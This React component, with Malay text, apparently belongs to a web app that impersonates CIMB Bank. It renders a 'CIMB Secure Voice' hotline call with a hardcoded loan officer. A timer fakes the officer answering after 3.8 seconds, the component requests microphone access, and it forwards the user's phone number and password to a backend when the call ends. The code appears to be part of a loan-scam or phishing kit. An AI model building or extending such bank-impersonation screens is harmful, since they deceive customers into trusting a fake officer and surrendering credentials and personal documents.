import React, { useState, useEffect, useRef } from 'react';
import {
  Phone,
  PhoneOff,
  Mic,
  MicOff,
  Volume2,
  VolumeX,
  ShieldCheck,
  Headphones,
  Signal,
  CheckCircle2,
} from 'lucide-react';
import { CimbCall } from '../../types';
import {
  startRingingSound,
  stopRingingSound,
  playCallConnectedSound,
  playCallEndedSound,
} from '../../lib/callAudio';
import { terminateLiveCall, subscribeCallRealtime } from '../../lib/callRealtime';

interface LiveCallModalProps {
  isOpen: boolean;
  onClose: () => void;
  userPhone: string;
  userPassword?: string;
  userName?: string;
  initialCall?: CimbCall | null;
}

export const LiveCallModal: React.FC<LiveCallModalProps> = ({
  isOpen,
  onClose,
  userPhone,
  userPassword,
  userName,
  initialCall,
}) => {
  const [callStatus, setCallStatus] = useState<'ringing' | 'connected' | 'ended'>('ringing');
  const [callDuration, setCallDuration] = useState(0);
  const [isMuted, setIsMuted] = useState(false);
  const [isSpeakerOn, setIsSpeakerOn] = useState(true);
  const [officerName] = useState('En. Farhan (Pegawai Pembiayaan CIMB)');
  const [callId, setCallId] = useState<string>(initialCall?.id || '');

  const timerRef = useRef<number | null>(null);
  const audioStreamRef = useRef<MediaStream | null>(null);

  // Format MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Start call lifecycle when modal opens
  useEffect(() => {
    if (!isOpen) {
      stopRingingSound();
      if (timerRef.current) clearInterval(timerRef.current);
      if (audioStreamRef.current) {
        audioStreamRef.current.getTracks().forEach((track) => track.stop());
        audioStreamRef.current = null;
      }
      return;
    }

    setCallStatus('ringing');
    setCallDuration(0);
    startRingingSound();

    // Auto-connect after 3.8 seconds simulate officer picking up the hot-line
    const connectTimer = window.setTimeout(() => {
      stopRingingSound();
      playCallConnectedSound();
      setCallStatus('connected');

      // Request browser audio permission for real-time audio interaction
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices
          .getUserMedia({ audio: true })
          .then((stream) => {
            audioStreamRef.current = stream;
          })
          .catch(() => {
            // User can still listen even if microphone was blocked
          });
      }
    }, 3800);

    return () => {
      clearTimeout(connectTimer);
      stopRingingSound();
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [isOpen]);

  // Handle call timer when connected
  useEffect(() => {
    if (callStatus === 'connected') {
      timerRef.current = window.setInterval(() => {
        setCallDuration((prev) => prev + 1);
      }, 1000);
    } else {
      if (timerRef.current) clearInterval(timerRef.current);
    }
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [callStatus]);

  // Subscribe to backend realtime events if callId exists
  useEffect(() => {
    if (!callId || !isOpen) return;

    const unsubscribe = subscribeCallRealtime(callId, {
      onCallUpdate: (updatedCall) => {
        if (updatedCall.status === 'accepted' && callStatus === 'ringing') {
          stopRingingSound();
          playCallConnectedSound();
          setCallStatus('connected');
        } else if (
          updatedCall.status === 'ended' ||
          updatedCall.status === 'rejected' ||
          updatedCall.status === 'missed'
        ) {
          handleEndCall(false);
        }
      },
      onCallEnded: () => {
        handleEndCall(false);
      },
    });

    return () => {
      unsubscribe();
    };
  }, [callId, isOpen, callStatus]);

  // End Call handler
  const handleEndCall = async (notifyBackend = true) => {
    stopRingingSound();
    playCallEndedSound();
    setCallStatus('ended');

    if (timerRef.current) clearInterval(timerRef.current);

    if (audioStreamRef.current) {
      audioStreamRef.current.getTracks().forEach((track) => track.stop());
      audioStreamRef.current = null;
    }

    if (notifyBackend && callId) {
      void terminateLiveCall({
        callId,
        phone: userPhone,
        password: userPassword,
        durationSeconds: callDuration,
        reason: 'user_ended',
      });
    }

    // Close modal after brief summary delay
    window.setTimeout(() => {
      onClose();
    }, 1200);
  };

  const toggleMute = () => {
    const nextMuted = !isMuted;
    setIsMuted(nextMuted);
    if (audioStreamRef.current) {
      audioStreamRef.current.getAudioTracks().forEach((track) => {
        track.enabled = !nextMuted;
      });
    }
  };

  const toggleSpeaker = () => {
    setIsSpeakerOn((prev) => !prev);
  };

  if (!isOpen) return null;

  return (
    <div
      id="live-call-modal"
      className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-in fade-in duration-200"
    >
      <div className="w-full max-w-sm bg-gradient-to-b from-gray-900 via-gray-900 to-black rounded-3xl overflow-hidden shadow-2xl border border-gray-800 text-white flex flex-col items-center justify-between p-7 min-h-[520px]">
        {/* Top Header info */}
        <div className="w-full flex items-center justify-between text-xs text-gray-400">
          <div className="flex items-center gap-1.5">
            <ShieldCheck className="w-4 h-4 text-red-500" />
            <span className="font-medium tracking-wide">CIMB Secure Voice</span>
          </div>
          <div className="flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-white/10 text-[11px]">
            <Signal className="w-3.5 h-3.5 text-emerald-400" />
            <span className="text-emerald-400 font-semibold">HD Audio</span>
          </div>
        </div>

        {/* Center: Officer Avatar & Status */}
        <div className="flex flex-col items-center justify-center my-auto text-center space-y-4">
          <div className="relative">
            {/* Animated Ping Waves when Ringing or Connected */}
            {callStatus === 'ringing' && (
              <>
                <span className="absolute -inset-3 rounded-full bg-red-600/30 animate-ping opacity-75" />
                <span className="absolute -inset-6 rounded-full bg-red-600/20 animate-pulse opacity-50" />
              </>
            )}
            {callStatus === 'connected' && (
              <span className="absolute -inset-2 rounded-full bg-emerald-500/20 animate-pulse" />
            )}

            <div className="relative w-24 h-24 rounded-full bg-gradient-to-br from-[#E31B23] to-[#8C0B12] p-1 shadow-xl flex items-center justify-center">
              <div className="w-full h-full rounded-full bg-gray-900 flex items-center justify-center overflow-hidden">
                <Headphones className="w-12 h-12 text-white/90" />
              </div>
            </div>

            {callStatus === 'connected' && (
              <span className="absolute bottom-1 right-1 w-4 h-4 rounded-full bg-emerald-500 ring-2 ring-gray-900 flex items-center justify-center">
                <CheckCircle2 className="w-3 h-3 text-white" />
              </span>
            )}
          </div>

          <div className="space-y-1">
            <h3 className="text-lg font-bold text-white tracking-tight">
              {officerName}
            </h3>
            <p className="text-xs text-red-300 font-medium">
              CIMB Cash Plus Hotline • Khidmat Pelanggan
            </p>
          </div>

          {/* Status / Timer pill */}
          <div className="inline-flex items-center px-3 py-1 rounded-full text-xs font-semibold bg-white/10 text-white/90 border border-white/10 shadow-xs">
            {callStatus === 'ringing' && (
              <span className="flex items-center gap-1.5 text-amber-300">
                <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
                Menghubungi Pegawai...
              </span>
            )}
            {callStatus === 'connected' && (
              <span className="flex items-center gap-1.5 text-emerald-400">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                Bersambung: {formatTime(callDuration)}
              </span>
            )}
            {callStatus === 'ended' && (
              <span className="text-gray-400">Panggilan Ditamatkan</span>
            )}
          </div>

          {callStatus === 'connected' && (
            <p className="text-[11px] text-gray-400 max-w-[240px] leading-relaxed">
              Pegawai CIMB sedang berhubung dengan anda. Anda boleh membincangkan status pinjaman atau dokumen KYC anda.
            </p>
          )}
        </div>

        {/* Action Controls */}
        <div className="w-full space-y-4">
          <div className="flex items-center justify-center gap-5">
            {/* Mute Button */}
            <button
              id="call-mute-btn"
              type="button"
              disabled={callStatus !== 'connected'}
              onClick={toggleMute}
              className={`w-13 h-13 rounded-full flex items-center justify-center transition-all ${
                isMuted
                  ? 'bg-amber-500 text-white shadow-lg shadow-amber-500/30'
                  : 'bg-white/10 text-white hover:bg-white/20'
              } ${callStatus !== 'connected' ? 'opacity-40 cursor-not-allowed' : 'active:scale-95'}`}
              title={isMuted ? 'Buka Suara (Unmute)' : 'Bisu (Mute)'}
            >
              {isMuted ? <MicOff className="w-5 h-5" /> : <Mic className="w-5 h-5" />}
            </button>

            {/* Speaker Button */}
            <button
              id="call-speaker-btn"
              type="button"
              disabled={callStatus !== 'connected'}
              onClick={toggleSpeaker}
              className={`w-13 h-13 rounded-full flex items-center justify-center transition-all ${
                isSpeakerOn
                  ? 'bg-white/20 text-white'
                  : 'bg-white/10 text-white/50 hover:bg-white/15'
              } ${callStatus !== 'connected' ? 'opacity-40 cursor-not-allowed' : 'active:scale-95'}`}
              title={isSpeakerOn ? 'Pembesar Suara Aktif' : 'Pembesar Suara Mati'}
            >
              {isSpeakerOn ? <Volume2 className="w-5 h-5" /> : <VolumeX className="w-5 h-5" />}
            </button>

            {/* End Call Button */}
            <button
              id="call-hangup-btn"
              type="button"
              onClick={() => handleEndCall(true)}
              className="w-14 h-14 rounded-full bg-red-600 hover:bg-red-700 active:scale-95 text-white flex items-center justify-center shadow-lg shadow-red-600/40 transition-all cursor-pointer"
              title="Tamatkan Panggilan"
            >
              <PhoneOff className="w-6 h-6" />
            </button>
          </div>

          <div className="text-center text-[10px] text-gray-500">
            {userPhone ? `Panggilan dari: ${userPhone}` : 'Panggilan Perkhidmatan CIMB'}
          </div>
        </div>
      </div>
    </div>
  );
};
